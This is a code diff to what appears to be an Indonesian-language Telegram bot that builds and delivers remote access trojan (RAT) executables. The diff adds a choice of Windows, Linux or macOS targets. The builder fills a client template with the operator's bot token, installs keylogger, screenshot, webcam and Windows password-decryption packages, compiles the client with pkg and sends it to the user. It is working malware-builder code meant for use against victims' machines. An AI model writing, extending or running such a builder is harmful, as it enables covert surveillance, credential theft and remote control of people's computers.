@@ -888,38 +888,81 @@ bot.on("callback_query", async (query) => {
             { text: "⬅️ Batal", callback_data: "awan_premium_menu" }
         ];
 
-        await bot.editMessageText('🤖 **Generate Desktop RAT**\n\nMemulai proses pembuatan RAT dengan semua fitur...', {
+        const platformMessage = "🤖 **Pembuatan RAT Interaktif**\n\nLangkah 1: Pilih platform target untuk RAT Anda.";
+        const platformButtons = [
+            { text: "🖥️ Windows", callback_data: "rat_platform_windows" },
+            { text: "🐧 Linux", callback_data: "rat_platform_linux" },
+            { text: "🍏 macOS", callback_data: "rat_platform_macos" },
+            { text: "⬅️ Batal", callback_data: "awan_premium_menu" }
+        ];
+
+        await bot.editMessageText(platformMessage, {
             chat_id: chatId,
             message_id: query.message.message_id,
+            reply_markup: createInlineKeyboard(platformButtons)
         });
+    }
+    else if (data.startsWith('rat_platform_')) {
+        const platform = data.split('_')[2];
+        const state = userStates[chatId] || { action: 'awaiting_rat_platform', data: {} };
+        if (state.action !== 'awaiting_rat_platform') {
+            return bot.answerCallbackQuery(query.id, { text: 'Sesi tidak valid atau telah kedaluwarsa.', show_alert: true });
+        }
 
+        bot.answerCallbackQuery(query.id);
         const generatingMessage = await bot.sendMessage(chatId, "⏳ Memulai proses pembuatan executable... Ini mungkin memakan waktu beberapa menit.");
 
         const tempDir = path.join(__dirname, 'temp', `rat_${chatId}_${Date.now()}`);
-        const outputExePath = path.join(tempDir, 'rat_client.exe');
+        let outputExePath;
+        let pkgTarget;
+
+        if (platform === 'windows') {
+            outputExePath = path.join(tempDir, 'rat_client.exe');
+            pkgTarget = 'node16-win-x64';
+        } else if (platform === 'linux') {
+            outputExePath = path.join(tempDir, 'rat_client-linux');
+            pkgTarget = 'node16-linux-x64';
+        } else if (platform === 'macos') {
+            outputExePath = path.join(tempDir, 'rat_client-macos');
+            pkgTarget = 'node16-macos-x64';
+        } else {
+            return bot.sendMessage(chatId, "Platform tidak valid.");
+        }
+
         const tempScriptPath = path.join(tempDir, 'rat_client.js');
         const tempPackageJsonPath = path.join(tempDir, 'package.json');
 
         try {
             fs.mkdirSync(tempDir, { recursive: true });
 
+            const baseDependencies = {
+                "node-telegram-bot-api": "^0.61.0",
+                "axios": "^1.10.0",
+                "screenshot-desktop": "^1.15.0",
+                "sqlite3": "^5.1.7",
+                "node-keylogger": "0.0.1",
+                "node-webcam": "^0.8.2"
+            };
+
+            if (platform === 'windows') {
+                baseDependencies['win-dpapi'] = '1.1.0';
+            }
+
             const ratPackageJson = {
                 name: 'rat-client',
                 version: '1.0.0',
                 main: 'rat_client.js',
-                dependencies: {
-                    "node-telegram-bot-api": "^0.61.0",
-                    "axios": "^1.10.0",
-                    "screenshot-desktop": "^1.15.0",
-                    "sqlite3": "^5.1.7",
-                    "win-dpapi": "1.1.0",
-                    "node-keylogger": "0.0.1",
-                    "node-webcam": "^0.8.2"
-                }
+                dependencies: baseDependencies
             };
             fs.writeFileSync(tempPackageJsonPath, JSON.stringify(ratPackageJson, null, 2));
 
-            const template = fs.readFileSync(path.join(__dirname, 'rat_client_template.js'), 'utf8');
+            let template = fs.readFileSync(path.join(__dirname, 'rat_client_template.js'), 'utf8');
+
+            if (platform !== 'windows') {
+                // Hapus fitur yang hanya untuk Windows
+                template = template.replace(/\/\/ -- START_FEATURE_PASSWORDS --[\s\S]*?\/\/ -- END_FEATURE_PASSWORDS --/g, '');
+            }
+
             const finalScript = template
                 .replace('%%BOT_TOKEN%%', config.botToken)
                 .replace('%%CHAT_ID%%', config.adminId);
@@ -929,11 +972,7 @@ bot.on("callback_query", async (query) => {
 
             await new Promise((resolve, reject) => {
                  exec(`npm install`, { cwd: tempDir }, (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`NPM Install Error: ${stderr}`);
-                        reject(new Error('Gagal menginstal dependensi untuk RAT.'));
-                        return;
-                    }
+                    if (error) { reject(new Error('Gagal menginstal dependensi.')); return; }
                     resolve(stdout);
                 });
             });
@@ -942,23 +981,18 @@ bot.on("callback_query", async (query) => {
 
             const pkgPath = path.join(__dirname, 'node_modules', '.bin', 'pkg');
             await new Promise((resolve, reject) => {
-                exec(`${pkgPath} . --targets node16-win-x64 --output ${outputExePath}`, { cwd: tempDir }, (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`PKG Error: ${stderr}`);
-                        reject(new Error('Gagal mengkompilasi executable.'));
-                        return;
-                    }
+                exec(`${pkgPath} . --targets ${pkgTarget} --output ${outputExePath}`, { cwd: tempDir }, (error, stdout, stderr) => {
+                    if (error) { reject(new Error('Gagal mengkompilasi executable.')); return; }
                     resolve(stdout);
                 });
             });
 
             await bot.editMessageText("... (3/4) Mengirim file...", { chat_id: chatId, message_id: generatingMessage.message_id });
 
-            await bot.sendDocument(chatId, outputExePath, {}, { caption: "✅ Berhasil! Berikut adalah RAT client Anda dengan semua fitur. Jalankan di mesin Windows target." });
+            await bot.sendDocument(chatId, outputExePath, {}, { caption: `✅ Berhasil! Berikut adalah RAT client Anda untuk ${platform}.` });
             await bot.deleteMessage(chatId, generatingMessage.message_id);
 
         } catch (e) {
-            console.error("Gagal membuat RAT executable:", e);
             await bot.editMessageText(`❌ Terjadi kesalahan: ${e.message}`, { chat_id: chatId, message_id: generatingMessage.message_id });
         } finally {
             if (fs.existsSync(tempDir)) {
